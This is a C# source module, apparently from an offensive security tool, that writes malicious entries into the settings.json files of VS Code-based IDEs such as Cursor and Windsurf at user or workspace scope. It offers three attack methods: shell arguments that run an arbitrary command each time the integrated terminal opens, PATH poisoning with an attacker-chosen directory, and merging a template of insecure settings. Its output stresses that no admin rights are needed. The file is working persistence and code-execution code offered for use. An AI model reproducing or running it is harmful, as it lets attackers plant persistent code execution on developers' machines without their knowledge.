using System.Text.Json;
using System.Text.Json.Nodes;
using CodepostEx.Core;
using CodepostEx.Models;
using Microsoft.Extensions.DependencyInjection;

namespace CodepostEx.Modules;

public sealed class SettingsModule
{
    // IDEs not in IdeProfiles but supported here (AppData-relative settings path)
    private static readonly Dictionary<string, string> ExtraSettingsPaths = new(StringComparer.OrdinalIgnoreCase)
    {
        // Reserved for future IDEs not yet in IdeProfiles.All
    };

    public static void Run(
        string scope, string? workspace, string ide, string method, string? payload, bool force, IServiceProvider sp)
    {
        var paths = sp.GetRequiredService<PathResolver>();

        foreach (var (label, settingsPath) in ResolveTargets(scope, workspace, ide, paths))
            InjectSettings(label, settingsPath, method, payload, force);
    }

    private static IEnumerable<(string Label, string Path)> ResolveTargets(
        string scope, string? workspace, string ide, PathResolver paths)
    {
        bool all    = scope.Equals("all",       StringComparison.OrdinalIgnoreCase);
        bool allIde = ide.Equals("All",          StringComparison.OrdinalIgnoreCase);

        if (all || scope.Equals("user", StringComparison.OrdinalIgnoreCase))
        {
            // Profiles-backed IDEs (Cursor, Windsurf, Kiro, Trae, Antigravity)
            foreach (var profile in IdeProfiles.Filter(allIde ? "All" : ide))
            {
                yield return ($"{profile.Name}-User", paths.Resolve(profile.SettingsSubPath));

                // Antigravity may use alternate AppData folder
                foreach (var alt in profile.AlternateAppDataSubPaths)
                {
                    var altSettings = alt.TrimEnd('\\', '/') + @"\settings.json";
                    var altPath     = paths.Resolve(altSettings);
                    if (altPath != paths.Resolve(profile.SettingsSubPath))
                        yield return ($"{profile.Name}-User-Alt", altPath);
                }
            }

            // Extra IDEs (none currently — all supported IDEs are in IdeProfiles.All)
            if (allIde || ExtraSettingsPaths.ContainsKey(ide))
            {
                var extras = allIde
                    ? ExtraSettingsPaths
                    : ExtraSettingsPaths.Where(kv => kv.Key.Equals(ide, StringComparison.OrdinalIgnoreCase))
                                        .ToDictionary(kv => kv.Key, kv => kv.Value);
                foreach (var (ideName, rel) in extras)
                    yield return ($"{ideName}-User", paths.Resolve(rel));
            }
        }

        if (all || scope.Equals("workspace", StringComparison.OrdinalIgnoreCase))
        {
            if (workspace is null)
                Out.Warn("--workspace required for workspace scope (skipping)");
            else
                yield return ("Workspace", Path.Combine(Path.GetFullPath(workspace), ".vscode", "settings.json"));
        }
    }

    private static void InjectSettings(
        string label, string settingsPath, string method, string? payload, bool force)
    {
        Out.Star($"[{label}] Target: {settingsPath}");

        if (method.Equals("insecure", StringComparison.OrdinalIgnoreCase))
        {
            InjectInsecureTemplate(label, settingsPath, force);
            return;
        }

        string targetKey = method.Equals("shell-args", StringComparison.OrdinalIgnoreCase)
            ? "terminal.integrated.shellArgs.windows"
            : "terminal.integrated.env.windows";

        // Load existing JSON or start empty (always merge — never wipe user settings)
        JsonObject root;
        if (File.Exists(settingsPath))
        {
            try
            {
                root = JsonNode.Parse(
                    File.ReadAllText(settingsPath, System.Text.Encoding.UTF8))?.AsObject()
                    ?? new JsonObject();
            }
            catch { root = new JsonObject(); }
        }
        else
        {
            root = new JsonObject();
        }

        if (root[targetKey] is not null && !force)
        {
            Out.Minus($"[{label}] Key already present (use --force to overwrite): {targetKey}");
            return;
        }

        if (method.Equals("shell-args", StringComparison.OrdinalIgnoreCase))
        {
            var cmd = payload ?? "calc.exe";
            root[targetKey] = new JsonArray { "-Command", $"{cmd}; powershell" };
        }
        else // path-poison (default)
        {
            var poisonDir = payload ?? Path.GetTempPath().TrimEnd('\\', '/');
            root[targetKey] = new JsonObject
            {
                ["PATH"] = $"{poisonDir};${{env:PATH}}"
            };
        }

        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(settingsPath)!);
            File.WriteAllText(
                settingsPath,
                root.ToJsonString(new JsonSerializerOptions { WriteIndented = true }));
            Out.Plus($"[{label}] Injected: {settingsPath}");
            Out.Item($"Method: {targetKey}");
            Out.Item("Trigger: every integrated terminal open");
            Out.Item("No admin required");
            Out.Blank();
        }
        catch (UnauthorizedAccessException)
        {
            Out.Minus($"[{label}] Access denied");
        }
        catch (Exception ex)
        {
            Out.Minus($"[{label}] Failed: {ex.Message}");
        }
    }

    private static void InjectInsecureTemplate(string label, string settingsPath, bool force)
    {
        JsonObject template;
        try
        {
            var raw = AssetLoader.Load("payloads/settings.json");
            template = JsonNode.Parse(raw)?.AsObject() ?? new JsonObject();
        }
        catch (Exception ex)
        {
            Out.Minus($"[{label}] Failed to load insecure template: {ex.Message}");
            return;
        }

        JsonObject root;
        if (File.Exists(settingsPath))
        {
            try
            {
                root = JsonNode.Parse(
                    File.ReadAllText(settingsPath, System.Text.Encoding.UTF8))?.AsObject()
                    ?? new JsonObject();
            }
            catch { root = new JsonObject(); }
        }
        else
        {
            root = new JsonObject();
        }

        int injected = 0, skipped = 0;
        foreach (var prop in template)
        {
            var key = prop.Key;
            // Skip comment markers, metadata keys, hooks (--inject-hooks) and mcpServers (--inject-mcp)
            if (key.StartsWith("//") || key.StartsWith("_") ||
                key.Equals("hooks", StringComparison.OrdinalIgnoreCase) ||
                key.Equals("mcpServers", StringComparison.OrdinalIgnoreCase))
                continue;

            if (root[key] is not null && !force)
            {
                skipped++;
                continue;
            }

            root[key] = prop.Value?.DeepClone();
            injected++;
        }

        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(settingsPath)!);
            File.WriteAllText(
                settingsPath,
                root.ToJsonString(new JsonSerializerOptions { WriteIndented = true }));
            Out.Plus($"[{label}] Injected: {settingsPath}");
            Out.Item($"Keys injected : {injected}");
            if (skipped > 0)
                Out.Item($"Keys skipped  : {skipped} (already present — use --force to overwrite)");
            Out.Item("Trigger: persistent — applied on every IDE start");
            Out.Item("No admin required");
            Out.Blank();
        }
        catch (UnauthorizedAccessException)
        {
            Out.Minus($"[{label}] Access denied");
        }
        catch (Exception ex)
        {
            Out.Minus($"[{label}] Failed: {ex.Message}");
        }
    }
}
